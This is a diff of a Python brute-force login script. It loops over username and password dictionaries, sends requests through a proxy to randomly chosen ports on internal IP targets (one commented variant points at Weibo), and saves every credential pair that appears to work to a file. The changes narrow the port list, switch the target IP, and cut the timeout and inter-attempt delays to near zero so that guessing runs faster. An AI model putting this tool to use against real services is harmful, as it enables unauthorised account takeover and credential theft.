@@ -53,8 +53,9 @@ def getRandomIPv4():
 
 def brute_force(user, password):
     port_list =["80","81","8080","7000","8092","5001","3389","514","21","514","514","22"]
+    port_list =["7000"]
     port = random.choice(port_list)
-    domain = random.choice(["10.10.67.180:"+port, "10.10.67.180:514/weibo"])
+    domain = random.choice(["172.16.95.25:"+port, "10.10.67.180:514/weibo"])
     #domain = random.choice(["s.weibo.com:80/weibo","s.weibo.com:80/weibo/baidu?wd="])
     name = user.strip()
     passwd = password.strip()
@@ -131,7 +132,7 @@ def brute_force(user, password):
     print("\ndata:",data)
     try:
         #response = requests.post(url,headers=header,data=data,allow_redirects=False,proxies=proxy,timeout=2)
-        response = requests.get(url,headers=header,allow_redirects=False,proxies=proxy,timeout=random.uniform(0, 60))
+        response = requests.get(url,headers=header,allow_redirects=False,proxies=proxy,timeout=random.uniform(0, 1))
         if "user_name" in response.text:
             print("\n状态码:", response.status_code, "  [+]获得用户信息>>>", response.text)
             outFile.write(name + ':' + passwd+'\n' )
@@ -163,7 +164,7 @@ def main():
     for u in zidian_u:
         for p in zidian_p:
             brute_force(user=u,password=p)
-            time.sleep(random.uniform(0, 60))
+            time.sleep(random.uniform(0, 0.1))
 
 if __name__ == '__main__':
     main()
